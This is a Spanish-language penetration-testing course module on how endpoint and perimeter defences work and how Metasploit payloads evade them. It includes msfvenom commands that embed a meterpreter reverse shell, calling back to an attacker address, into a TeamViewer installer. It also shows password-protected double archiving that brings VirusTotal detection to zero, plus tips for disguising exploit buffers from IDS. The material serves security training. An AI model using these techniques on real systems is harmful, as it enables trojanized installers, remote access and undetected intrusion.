Para aprender mejor cómo podemos atacar de manera eficiente y silenciosa un objetivo, primero necesitamos entender mejor cómo se defiende ese objetivo. Se nos presentan dos nuevos términos:

- Protección de endpoint
- Protección del perímetro

---

## Endpoint Protection

`Endpoint protection` se refiere a cualquier dispositivo o servicio localizado cuyo único propósito es proteger un solo host en la red. El host puede ser una computadora personal, una estación de trabajo corporativa o un servidor en la Zona Desmilitarizada (`DMZ`) de una red.

La protección de endpoint generalmente viene en forma de paquetes de software que incluyen `Antivirus Protection`, `Antimalware Protection` (esto incluye bloatware, spyware, adware, scareware, ransomware), `Firewall`, y `Anti-DDOS` todo en uno, bajo el mismo paquete de software. Estamos más familiarizados con esta forma que con la última, ya que la mayoría de nosotros estamos ejecutando software de protección de endpoint en nuestras PC en casa o en las estaciones de trabajo en nuestro lugar de trabajo. Avast, Nod32, Malwarebytes y BitDefender son solo algunos nombres actuales.

---

### Perimeter Protection

`Perimeter protection` generalmente viene en dispositivos físicos o virtualizados en el borde del perímetro de la red. Estos `edge devices` proporcionan acceso `dentro` de la red desde el `exterior`, en otras palabras, desde el `público` al `privado`.

Entre estas dos zonas, en algunas ocasiones, también encontraremos una tercera, llamada Zona Desmilitarizada (`DMZ`), que se mencionó anteriormente. Esta es una zona con un `nivel de política de seguridad más bajo` que la zona de `redes internas`, pero con un `nivel de confianza` más alto que la `zona externa`, que es el vasto Internet. Este es el espacio virtual donde se alojan los servidores orientados al público, que empujan y tiran datos para clientes públicos desde Internet, pero que también se gestionan desde dentro y se actualizan con parches, información y otros datos para mantener la información servida actualizada y satisfacer a los clientes de los servidores.

---

## Security Policies

Las políticas de seguridad son el motor detrás de cualquier postura de seguridad bien mantenida en cualquier red. Funcionan de la misma manera que las listas de control de acceso (ACL) para aquellos familiarizados con el material educativo de Cisco CCNA. Esencialmente, son una lista de declaraciones `allow` y `deny` que dictan cómo el tráfico o los archivos pueden existir dentro de los límites de una red. Múltiples listas pueden actuar sobre múltiples partes de la red, lo que permite flexibilidad dentro de una configuración. Estas listas también pueden dirigirse a diferentes características de la red y los hosts, dependiendo de dónde residen:

- Políticas de tráfico de red
- Políticas de aplicaciones
- Políticas de control de acceso de usuario
- Políticas de gestión de archivos
- Políticas de protección DDoS
- Otros

Aunque no todas estas categorías anteriores pueden tener las palabras "Política de Seguridad" adjuntas a ellas, todos los mecanismos de seguridad que las rodean operan bajo el mismo principio básico, las entradas de `allow` y `deny`. La única diferencia es el objetivo del objeto al que se refieren y aplican. Entonces, la pregunta sigue siendo, ¿cómo hacemos coincidir eventos en la red con estas reglas para que se puedan tomar las acciones mencionadas anteriormente?

Hay múltiples formas de hacer coincidir un evento u objeto con una entrada de política de seguridad:

| **Security Policy**                     | **Description**                                                                                                                                                                                                                                      |
|-----------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| `Signature-based Detection`             | La operación de paquetes en la red y la comparación con patrones de ataque preconstruidos y predeterminados conocidos como firmas. Cualquier coincidencia del 100% con estas firmas generará alarmas.                                                                                         |
| `Heuristic / Statistical Anomaly Detection` | Comparación de comportamiento contra una línea base establecida que incluye firmas de modus operandi para amenazas persistentes avanzadas (APT). La línea base identificará la norma para la red y qué protocolos se utilizan comúnmente. Cualquier desviación del umbral máximo generará alarmas. |
| `Stateful Protocol Analysis Detection`  | Reconociendo la divergencia de protocolos mediante la comparación de eventos usando perfiles preconstruidos de definiciones generalmente aceptadas de actividad no maliciosa.                                                                          |
| `Live-monitoring and Alerting (SOC-based)` | Un equipo de analistas en un SOC (Security Operations Center) dedicado, interno o arrendado, utiliza software de monitoreo en tiempo real para observar la actividad de la red y sistemas de alarma intermedios para cualquier amenaza potencial, decidiendo si la amenaza debe ser accionada o dejando que los mecanismos automatizados tomen acción en su lugar. |

---

## Evasion Techniques

La mayoría del software antivirus basado en host en la actualidad se basa principalmente en `Signature-based Detection` para identificar aspectos del código malicioso presente en una muestra de software. Estas firmas se colocan dentro del Motor Antivirus, donde posteriormente se utilizan para escanear el espacio de almacenamiento y los procesos en ejecución en busca de coincidencias. Cuando una pieza de software desconocido aterriza en una partición y es coincidente por el software Antivirus, la mayoría de los antivirus ponen en cuarentena el programa malicioso y matan el proceso en ejecución.

¿Cómo esquivamos todo este calor? Jugamos con él. Los ejemplos mostrados en la sección `Encoders` muestran que simplemente codificar payloads usando diferentes esquemas de codificación con múltiples iteraciones no es suficiente para todos los productos AV. Además, simplemente establecer un canal de comunicación entre el atacante y la víctima puede levantar algunas alarmas con las capacidades actuales de los productos IDS/IPS.

Sin embargo, con el lanzamiento de MSF6, msfconsole puede tunelizar la comunicación cifrada con AES desde cualquier shell de Meterpreter de vuelta al host atacante, cifrando con éxito el tráfico a medida que el payload se envía al host víctima. Esto se encarga principalmente de los IDS/IPS basados en red. En algunos casos raros, podemos encontrarnos con reglas de tráfico muy estrictas que marcan nuestra conexión en función de la dirección IP del remitente. La única forma de esquivar esto es encontrar los servicios que se permiten pasar. Un excelente ejemplo de esto sería el hackeo de Equifax en 2017, donde los hackers maliciosos abusaron de la vulnerabilidad de Apache Struts para acceder a una red de servidores de datos críticos. Se utilizaron técnicas de exfiltración de DNS para filtrar datos lentamente fuera de la red y hacia el dominio de los hackers sin ser notados durante meses. Para aprender más sobre este ataque, visite los siguientes enlaces:

- [US Government Post-Mortem Report on the Equifax Hack](https://www.zdnet.com/article/us-government-releases-post-mortem-report-on-equifax-hack/)
- [Protecting from DNS Exfiltration](https://www.darkreading.com/risk/tips-to-protect-the-dns-from-data-exfiltration/a/d-id/1330411)
- [Stoping Data Exfil and Malware Spread through DNS](https://www.infoblox.com/wp-content/uploads/infoblox-whitepaper-stopping-data-exfiltration-and-malware-spread-through-dns.pdf)

Volviendo a msfconsole, su capacidad de mantener túneles cifrados con AES, junto con la característica de Meterpreter de ejecutarse en memoria, aumenta nuestra capacidad en un margen considerable. Sin embargo, todavía tenemos el problema de lo que sucede con un payload una vez que llega a su destino, antes de que se ejecute y se coloque en la memoria. Este archivo podría ser identificado por su firma, coincidente contra la base de datos y bloqueado, junto con nuestras oportunidades de acceder al objetivo. También podemos estar seguros de que los desarrolladores de software AV están mirando los módulos y capacidades de msfconsole para agregar el código resultante y los archivos a su base de datos de firmas, lo que resulta en que la mayoría, si no todos, los payloads predeterminados se cierren inmediatamente por el software AV hoy en día.

Estamos de suerte porque `msfvenom` ofrece la opción de usar plantillas ejecutables. Esto nos permite usar algunas plantillas preestablecidas para archivos ejecutables, inyectar nuestro payload en ellos (sin juego de palabras) y usar `cualquier` ejecutable como una plataforma desde la cual podemos lanzar nuestro ataque. Podemos incrustar el shellcode en cualquier instalador, paquete o programa que tengamos a mano, ocultando el shellcode malicioso dentro del código legítimo del producto real. Esto oculta en gran medida nuestro código malicioso y, lo que es más importante, reduce nuestras posibilidades de detección. Hay muchas combinaciones válidas entre archivos ejecutables legítimos reales, nuestros diferentes esquemas de codificación (y sus iteraciones) y nuestras diferentes variantes de shellcode de payload. Esto genera lo que se llama un ejecutable con puerta trasera.

Echa un vistazo al fragmento a continuación para entender cómo msfvenom puede incrustar payloads en cualquier archivo ejecutable:

```r
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5

Attempting to read payload from STDIN...
Found 1 compatible encoders
Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 27 (iteration=0)
x86/shikata_ga_nai

 succeeded with size 54 (iteration=1)
x86/shikata_ga_nai succeeded with size 81 (iteration=2)
x86/shikata_ga_nai succeeded with size 108 (iteration=3)
x86/shikata_ga_nai succeeded with size 135 (iteration=4)
x86/shikata_ga_nai chosen with final size 135
Payload size: 135 bytes
Saved as: /home/user/Desktop/TeamViewer_Setup.exe
```

```r
ls

Pictures-of-cats.tar.gz  TeamViewer_Setup.exe  Cake_recipes
```

En la mayoría de los casos, cuando un objetivo lanza un ejecutable con puerta trasera, no parecerá que sucede nada, lo que puede levantar sospechas en algunos casos. Para mejorar nuestras posibilidades, necesitamos activar la continuación de la ejecución normal de la aplicación lanzada mientras extraemos el payload en un hilo separado de la aplicación principal. Hacemos esto con el indicador `-k`, como aparece arriba. Sin embargo, incluso con el indicador `-k` funcionando, el objetivo solo notará la puerta trasera en ejecución si lanzan la plantilla del ejecutable con puerta trasera desde un entorno CLI. Si lo hacen, aparecerá una ventana separada con el payload, que no se cerrará hasta que terminemos la interacción de la sesión del payload en el objetivo.

---

## Archives

Archivar una pieza de información, como un archivo, carpeta, script, ejecutable, imagen o documento y colocar una contraseña en el archivo evita muchas firmas antivirus comunes en la actualidad. Sin embargo, la desventaja de este proceso es que se levantarán notificaciones en el tablero de alarmas del AV como no escaneables debido a estar bloqueados con una contraseña. Un administrador puede optar por inspeccionar manualmente estos archivos para determinar si son maliciosos o no.

### Generating Payload
```r
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5

Attempting to read payload from STDIN...
Found 1 compatible encoders
Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 27 (iteration=0)
x86/shikata_ga_nai succeeded with size 54 (iteration=1)
x86/shikata_ga_nai succeeded with size 81 (iteration=2)
x86/shikata_ga_nai succeeded with size 108 (iteration=3)
x86/shikata_ga_nai succeeded with size 135 (iteration=4)
x86/shikata_ga_nai chosen with final size 135
Payload size: 135 bytes
Saved as: /home/user/test.js
```

```r
cat test.js

�+n"����t$�G4ɱ1zz��j�V6����ic��o�Bs>��Z*�����9vt��%��1�
<...SNIP...>
�Qa*���޴��RW�%Š.\�=;.l�T���XF���T��
```

Si verificamos contra VirusTotal para obtener una línea base de detección del payload que generamos, los resultados serán los siguientes.

### VirusTotal
```r
msf-virustotal -k <API key> -f test.js 

[*] WARNING: When you upload or otherwise submit content, you give VirusTotal
[*] (and those we work with) a worldwide, royalty free, irrevocable and transferable
[*] licence to use, edit, host, store, reproduce, modify, create derivative works,
[*] communicate, publish, publicly perform, publicly display and distribute such
[*] content. To read the complete Terms of Service for VirusTotal, please go to the
[*] following link:
[*] https://www.virustotal.com/en/about/terms-of-service/
[*] 
[*] If you prefer your own API key, you may obtain one at VirusTotal.

[*] Enter 'Y' to acknowledge: Y


[*] Using API key: <API key>
[*] Please wait while I upload test.js...
[*] VirusTotal: Scan request successfully queued, come back later for the report
[*] Sample MD5 hash    : 35e7687f0793dc3e048d557feeaf615a
[*] Sample SHA1 hash   : f2f1c4051d8e71df0741b40e4d91622c4fd27309
[*] Sample SHA256 hash : 08799c1b83de42ed43d86247ebb21cca95b100f6a45644e99b339422b7b44105
[*] Analysis link: https://www.virustotal.com/gui/file/<SNIP>/detection/f-<SNIP>-1652167047
[*] Requesting the report...
[*] Received code 0. Waiting for another 60 seconds...
[*] Analysis Report: test.js (11 / 59): <...SNIP...>
====================================================================================================

 Antivirus             Detected  Version               Result                             Update
 ---------             --------  -------               ------                             ------
 ALYac                 true      1.1.3.1               Exploit.Metacoder.Shikata.Gen      20220510
 AVG                   true      21.1.5827.0           Win32:ShikataGaNai-A [Trj]         20220510
 Acronis               false     1.2.0.108                                                20220426
 Ad-Aware              true      3.0.21.193            Exploit.Metacoder.Shikata.Gen      20220510
 AhnLab-V3             false     3.21.3.10230                                             20220510
 Antiy-AVL             false     3.0                                                      20220510
 Arcabit               false     1.0.0.889                                                20220510
 Avast                 true      21.1.5827.0           Win32:ShikataGaNai-A [Trj]         20220510
 Avira                 false     8.3.3.14                                                 20220510
 Baidu                 false     1.0.0.2                                                  20190318
 BitDefender           true      7.2                   Exploit.Metacoder.Shikata.Gen      20220510
 BitDefenderTheta      false     7.2.37796.0                                              20220428
 Bkav                  false     1.3.0.9899                                               20220509
 CAT-QuickHeal         false     14.00                                                    20220510
 CMC                   false     2.10.2019.1                                              20211026
 ClamAV                true      0.105.0.0             Win.Trojan.MSShellcode-6360729-0   20220509
 Comodo                false     34607                                                    20220510
 Cynet                 false     4.0.0.27                                                 20220510
 Cyren                 false     6.5.1.2                                                  20220510
 DrWeb                 false     7.0.56.4040                                              20220510
 ESET-NOD32            false     25243                                                    20220510
 Emsisoft              true      2021.5.0.7597         Exploit.Metacoder.Shikata.Gen (B)  20220510
 F-Secure              false     18.10.978.51                                             20220510
 FireEye               true      35.24.1.0             Exploit.Metacoder.Shikata.Gen      20220510
 Fortinet              false     6.2.142.0                                                20220510
 GData                 true      A:25.33002B:27.27300  Exploit.Metacoder.Shikata.Gen      20220510
 Gridinsoft            false     1.0.77.174                                               20220510
 Ikarus                false     6.0.24.0                                                 20220509
 Jiangmin              false     16.0.100                                                 20220509
 K7AntiVirus           false     12.12.42275                                              20220510
 K7GW                  false     12.12.42275                                              20220510
 Kaspersky             false     21.0.1.45                                                20220510
 Kingsoft              false     2017.9.26.565                                            20220510
 Lionic                false     7.5                                                      20220510
 MAX                   true      2019.9.16.1           malware (ai score=89)              20220510
 Malwarebytes          false     4.2.2.27                                                 20220510
 MaxSecure             false     1.0.0.1                                                  20220510
 McAfee                false     6.0.6.653                                                20220510
 McAfee-GW-Edition     false     v2019.1.2+3728                                           20220510
 MicroWorld-eScan      true      14.0.409.0            Exploit.Metacoder.Shikata.Gen      20220510
 Microsoft             false     1.1.19200.5                                              20220510
 N

ANO-Antivirus        false     1.0.146.25588                                            20220510
 Panda                 false     4.6.4.2                                                  20220509
 Rising                false     25.0.0.27                                                20220510
 SUPERAntiSpyware      false     5.6.0.1032                                               20220507
 Sangfor               false     2.14.0.0                                                 20220507
 Sophos                false     1.4.1.0                                                  20220510
 Symantec              false     1.17.0.0                                                 20220510
 TACHYON               false     2022-05-10.02                                            20220510
 Tencent               false     1.0.0.1                                                  20220510
 TrendMicro            false     11.0.0.1006                                              20220510
 TrendMicro-HouseCall  false     10.0.0.1040                                              20220510
 VBA32                 false     5.0.0                                                    20220506
 ViRobot               false     2014.3.20.0                                              20220510
 VirIT                 false     9.5.191                                                  20220509
 Yandex                false     5.5.2.24                                                 20220428
 Zillya                false     2.0.0.4627                                               20220509
 ZoneAlarm             false     1.0                                                      20220510
 Zoner                 false     2.2.2.0                                                  20220509
```

Ahora, intente archivarlo dos veces, estableciendo una contraseña en ambos archivos al crearlos y eliminando la extensión `.rar`/`.zip`/`.7z` de sus nombres. Para este propósito, podemos instalar la [utilidad RAR](https://www.rarlab.com/download.htm) de RARLabs, que funciona exactamente como WinRAR en Windows.

### Archiving the Payload

```r
wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
tar -xzvf rarlinux-x64-612.tar.gz && cd rar
rar a ~/test.rar -p ~/test.js

Enter password (will not be echoed): ******
Reenter password: ******

RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
Trial version             Type 'rar -?' for help
Evaluation copy. Please register.

Creating archive test.rar
Adding    test.js                                                     OK 
Done
```

```r
ls

test.js   test.rar
```

### Removing the .RAR Extension

```r
mv test.rar test
ls

test   test.js
```

### Archiving the Payload Again

```r
rar a test2.rar -p test

Enter password (will not be echoed): ******
Reenter password: ******

RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
Trial version             Type 'rar -?' for help
Evaluation copy. Please register.

Creating archive test2.rar
Adding    test                                                        OK 
Done
```

### Removing the .RAR Extension

```r
mv test2.rar test2
ls

test   test2   test.js
```

El archivo test2 es el archivo .rar final con la extensión (.rar) eliminada del nombre. Después de eso, podemos proceder a cargarlo en VirusTotal para otra verificación.

### VirusTotal

```r
msf-virustotal -k <API key> -f test2

[*] Using API key: <API key>
[*] Please wait while I upload test2...
[*] VirusTotal: Scan request successfully queued, come back later for the report
[*] Sample MD5 hash    : 2f25eeeea28f737917e59177be61be6d
[*] Sample SHA1 hash   : c31d7f02cfadd87c430c2eadf77f287db4701429
[*] Sample SHA256 hash : 76ec64197aa2ac203a5faa303db94f530802462e37b6e1128377315a93d1c2ad
[*] Analysis link: https://www.virustotal.com/gui/file/<SNIP>/detection/f-<SNIP>-1652167804
[*] Requesting the report...
[*] Received code 0. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Analysis Report: test2 (0 / 49): 76ec64197aa2ac203a5faa303db94f530802462e37b6e1128377315a93d1c2ad
=================================================================================================

 Antivirus             Detected  Version         Result  Update
 ---------             --------  -------         ------  ------
 ALYac                 false     1.1.3.1                 20220510
 Acronis               false     1.2.0.108               20220426
 Ad-Aware              false     3.0.21.193              20220510
 AhnLab-V3             false     3.21.3.10230            20220510
 Antiy-AVL             false     3.0                     20220510
 Arcabit               false     1.0.0.889               20220510
 Avira                 false     8.3.3.14                20220510
 BitDefender           false     7.2                     20220510
 BitDefenderTheta      false     7.2.37796.0             20220428
 Bkav                  false     1.3.0.9899              20220509
 CAT-QuickHeal         false     14.00                   20220510
 CMC                   false     2.10.2019.1             20211026
 ClamAV                false     0.105.0.0               20220509
 Comodo                false     34606                   20220509
 Cynet                 false     4.0.0.27                20220510
 Cyren                 false     6.5.1.2                 20220510
 DrWeb                 false     7.0.56.4040             20220510
 ESET-NOD32            false     25243                   20220510
 Emsisoft              false     2021.5.0.7597           20220510
 F-Secure              false     18.10.978.51            20220510
 FireEye               false     35.24.1.0               20220510
 Fortinet              false     6.2.142.0               20220510
 Gridinsoft            false     1.0.77.174              20220510
 Jiangmin              false     16.0.100                20220509
 K7AntiVirus           false     12.12.42275             20220510
 K7GW                  false     12.12.42275             20220510
 Kingsoft              false     2017.9.26.565           20220510
 Lionic                false     7.5                     20220510
 MAX                   false     2019.9.16.1             20220510
 Malwarebytes          false     4.2.2.27                20220510
 MaxSecure             false     1.0.0.1                 20220510
 McAfee-GW-Edition     false     v2019.1.2+3728          20220510
 MicroWorld-eScan      false     14.0.409.0              20220510
 NANO-Antivirus        false     1.0.146.25588           20220510
 Panda                 false     4.6.4.2                 20220509
 Rising                false     25.0.0.27               20220510
 SUPERAntiSpyware      false     5.6.0.1032              20220507
 Sangfor               false     2.14.0.0                20220507
 Symantec              false     1.17.0.0                20220510
 TACHYON               false     2022-05-10.02           20220510
 Tencent               false     1.0.0.1                 20220510
 TrendMicro-HouseCall  false     10.0.0.1040             20220510
 VBA32                 false     5.0.0                   20220506
 ViRobot               false     2014.3.20.0             20220510
 VirIT                 false     9.5.191                 20220509
 Yandex                false     5.5.2.24                20220428
 Zillya                false     2.0.0.4627              20220509
 ZoneAlarm             false     1.0                     20220510
 Zoner                 false

     2.2.2.0                 20220509
```

Como podemos ver en lo anterior, esta es una excelente manera de transferir datos tanto `hacia` como `desde` el host objetivo.

---

## Packers

El término `Packer` se refiere al resultado de un proceso de `compresión de ejecutables` donde el payload se empaqueta junto con un programa ejecutable y con el código de descompresión en un solo archivo. Al ejecutarse, el código de descompresión devuelve el ejecutable con puerta trasera a su estado original, lo que permite una capa más de protección contra los mecanismos de escaneo de archivos en los hosts objetivo. Este proceso ocurre de manera transparente para que el ejecutable comprimido se ejecute de la misma manera que el ejecutable original, conservando toda la funcionalidad original. Además, msfvenom proporciona la capacidad de comprimir y cambiar la estructura de archivo de un ejecutable con puerta trasera y cifrar la estructura del proceso subyacente.

Una lista de software packer popular:


| [UPX packer](https://upx.github.io/) | [The Enigma Protector](https://enigmaprotector.com/) | [MPRESS](https://www.matcode.com/mpress.htm) |
| ------------------------------------ | ---------------------------------------------------- | -------------------------------------------- |
| \|Alternate EXE Packer               | ExeStealth                                           | Morphine                                     |
| MEW                                  | Themida                                              |                                              |

Si queremos aprender más sobre packers, por favor consulte el [proyecto PolyPack](https://jon.oberheide.org/files/woot09-polypack.pdf).

---

## Exploit Coding

Al codificar nuestro exploit o portar uno preexistente al Framework, es bueno asegurarse de que el código del exploit no sea fácilmente identificable por las medidas de seguridad implementadas en el sistema objetivo.

Por ejemplo, un exploit típico de `Buffer Overflow` podría distinguirse fácilmente del tráfico regular que viaja por la red debido a sus patrones de buffer hexadecimal. Las ubicaciones de IDS / IPS pueden verificar el tráfico hacia la máquina objetivo y notar patrones específicos sobreutilizados para explotar el código.

Al ensamblar nuestro código de exploit, la aleatorización puede ayudar a agregar algo de variación a esos patrones, lo que romperá las firmas de la base de datos del IPS / IDS para buffers de exploits bien conocidos. Esto se puede hacer ingresando un conmutador de `Offset` dentro del código para el módulo msfconsole:

```r
'Targets' =>
[
 	[ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],
],
```

Además del código BoF, uno siempre debe evitar el uso de NOP sleds obvios donde el shellcode debería aterrizar después de que se complete el desbordamiento. Tenga en cuenta que el propósito del código BoF es bloquear el servicio que se ejecuta en la máquina objetivo, mientras que el NOP sled es la memoria asignada donde se inserta nuestro shellcode (el payload). Las entidades IPS/IDS revisan regularmente ambos, por lo que es bueno probar nuestro código de exploit personalizado en un entorno sandbox antes de implementarlo en la red del cliente. Por supuesto, podríamos tener solo una oportunidad de hacerlo correctamente durante una evaluación.

Para obtener más información sobre la codificación de exploits, recomendamos consultar el libro [Metasploit - The Penetration Tester's Guide](https://nostarch.com/metasploit) de No Starch Press. Profundizan bastante en la creación de nuestros propios exploits para el Framework.

---

## Recompiling Meterpreter from Source Code

Los sistemas de prevención de intrusiones y los motores antivirus son las herramientas de defensa más comunes que pueden detener un punto de apoyo inicial en el objetivo. Estos funcionan principalmente con firmas de todo el archivo malicioso o la etapa inicial.

---

## A Note on Evasion

Esta sección cubre la evasión a un alto nivel. Esté atento a los módulos posteriores que profundizarán en la teoría y el conocimiento práctico necesarios para realizar la evasión de manera más efectiva. Vale la pena probar algunas de estas técnicas en máquinas HTB más antiguas o instalar una VM con versiones antiguas de Windows Defender o motores AV gratuitos, y practicar habilidades de evasión. Este es un tema vasto que no se puede cubrir adecuadamente en una sola sección.